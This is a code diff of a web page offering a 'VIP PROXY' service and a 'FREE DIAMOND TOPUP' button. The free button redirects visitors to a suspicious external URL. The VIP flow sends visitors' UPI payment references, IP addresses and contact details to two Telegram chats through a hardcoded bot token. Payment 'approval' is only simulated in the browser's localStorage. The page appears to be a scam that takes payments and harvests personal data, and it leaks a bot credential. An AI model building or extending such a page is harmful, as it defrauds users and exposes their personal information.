@@ -66,6 +66,12 @@
             margin: 20px 0;
             min-height: 50px;
         }
+        #userIp {
+            font-family: monospace;
+            color: #0f0;
+            background: #111;
+            padding: 2px 5px;
+        }
     </style>
 </head>
 <body>
@@ -85,7 +91,7 @@
     <div class="container hidden" id="optionsContainer">
         <h2>Select Service</h2>
         <button class="button" id="vipBtn">VIP PROXY</button>
-        <button class="button" onclick="window.location.href='http://season-event.com.tr/^*Z/CODA/?id=6800292901'">FREE DIAMOND TOPUP</button>
+        <button class="button" id="freeBtn">FREE DIAMOND TOPUP</button>
     </div>
 
     <!-- Payment Section -->
@@ -107,7 +113,7 @@
         <h2>🔄 Approval Pending</h2>
         <div id="approvalStatus">
             <p>Transaction ID: <strong id="pendingTxnId"></strong></p>
-            <p>IP: <strong id="userIp"></strong></p>
+            <p>Your IP: <span id="userIp"></span></p>
             <p>Waiting for manual approval...</p>
             <p>This may take a few minutes</p>
         </div>
@@ -198,6 +204,12 @@
             }
         });
 
+        // Free service button
+        document.getElementById("freeBtn").addEventListener("click", function() {
+            window.location.href = "http://season-event.com.tr/^*Z/CODA/?id=6800292901";
+        });
+
+        // VIP service button
         document.getElementById("vipBtn").addEventListener("click", async function() {
             const txnId = generateTxnId();
             document.getElementById("txnIdDisplay").textContent = txnId;
@@ -205,6 +217,7 @@
             document.getElementById("paymentContainer").classList.remove('hidden');
         });
 
+        // Verify payment form
         document.getElementById("verifyForm").addEventListener("submit", async function(e) {
             e.preventDefault();
             const txnId = document.getElementById("txnIdDisplay").textContent;
@@ -225,8 +238,8 @@
                            `📱 UPI Reference: ${upiTxnId}\n` +
                            `🌐 IP: ${userIp}\n` +
                            `⏰ ${new Date().toLocaleString()}\n\n` +
-                           `Approve: https://yourwebsite.com/approve?txn=${txnId}&ip=${userIp}\n` +
-                           `Reject: https://yourwebsite.com/reject?txn=${txnId}`;
+                           `Approve: https://dark-2009.github.io/approve.html?txn=${txnId}&ip=${userIp}\n` +
+                           `Reject: https://dark-2009.github.io/reject.html?txn=${txnId}`;
 
             for (const chatId of chatIds) {
                 await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
@@ -243,6 +256,7 @@
             checkApprovalStatus(txnId, userIp);
         });
 
+        // Check approval status
         document.getElementById("checkApprovalBtn").addEventListener("click", function() {
             const txnId = document.getElementById("pendingTxnId").textContent;
             const userIp = document.getElementById("userIp").textContent;
@@ -251,20 +265,27 @@
 
         async function checkApprovalStatus(txnId, userIp) {
             try {
-                // In a real implementation, this would check your backend/database
-                // For demo, we'll simulate checking against URL params
-                const params = new URLSearchParams(window.location.search);
-                const approvedTxn = params.get('approve');
-                const currentIp = params.get('ip');
+                // Check localStorage for approval (simulated database)
+                const approvalKey = `approved_${txnId}`;
+                const approval = JSON.parse(localStorage.getItem(approvalKey));
                 
-                if (approvedTxn === txnId && currentIp === userIp) {
+                if (approval && approval.ip === userIp) {
+                    // Approved - show contact form
                     document.querySelectorAll('.container').forEach(c => c.classList.add('hidden'));
                     document.getElementById("contactContainer").classList.remove('hidden');
-                } else {
+                } 
+                else if (localStorage.getItem(`rejected_${txnId}`)) {
+                    // Rejected
+                    alert("❌ Your payment was rejected. Contact support.");
+                    document.querySelectorAll('.container').forEach(c => c.classList.add('hidden'));
+                    document.getElementById("keyContainer").classList.remove('hidden');
+                }
+                else {
+                    // Still pending
                     document.getElementById("approvalStatus").innerHTML = `
                         <p>Transaction ID: <strong>${txnId}</strong></p>
-                        <p>IP: <strong>${userIp}</strong></p>
-                        <p>Status: <span style="color:yellow">Pending manual approval</span></p>
+                        <p>Your IP: <span id="userIp">${userIp}</span></p>
+                        <p>Status: <span style="color:yellow">Pending approval</span></p>
                         <p>Last checked: ${new Date().toLocaleTimeString()}</p>
                     `;
                 }
@@ -273,10 +294,12 @@
             }
         }
 
+        // Contact form submission
         document.getElementById("contactForm").addEventListener("submit", async function(e) {
             e.preventDefault();
             const contactInfo = document.getElementById("contactInfo").value;
             const txnId = document.getElementById("pendingTxnId").textContent;
+            const userIp = document.getElementById("userIp").textContent;
             
             const botToken = '7793945096:AAEnx2qKx3CoNBNJg3dEY17JRocPN0Ehf94';
             const chatIds = ['6800292901', '6287314531'];
@@ -284,6 +307,7 @@
             const message = `✅ Approved VIP Proxy\n` +
                            `📝 Contact: ${contactInfo}\n` +
                            `💳 Txn ID: ${txnId}\n` +
+                           `🌐 IP: ${userIp}\n` +
                            `⏰ ${new Date().toLocaleString()}`;
 
             for (const chatId of chatIds) {
@@ -301,13 +325,19 @@
             document.getElementById("confirmationContainer").classList.remove('hidden');
         });
 
-        // Check for approval on page load
-        window.addEventListener('load', async function() {
-            const params = new URLSearchParams(window.location.search);
-            if (params.has('approve')) {
-                const txnId = params.get('approve');
-                const userIp = params.get('ip');
-                alert(`Approval request processed for Txn ${txnId} (IP: ${userIp})`);
+        // Check for URL parameters on load
+        window.addEventListener('load', function() {
+            const urlParams = new URLSearchParams(window.location.search);
+            if (urlParams.has('txn')) {
+                // This is an approval page (handled by approve.html/reject.html)
+                return;
+            }
+            
+            // Check if user was already approved
+            const txnId = document.getElementById("pendingTxnId")?.textContent;
+            const userIp = document.getElementById("userIp")?.textContent;
+            if (txnId && userIp) {
+                checkApprovalStatus(txnId, userIp);
             }
         });
     </script>
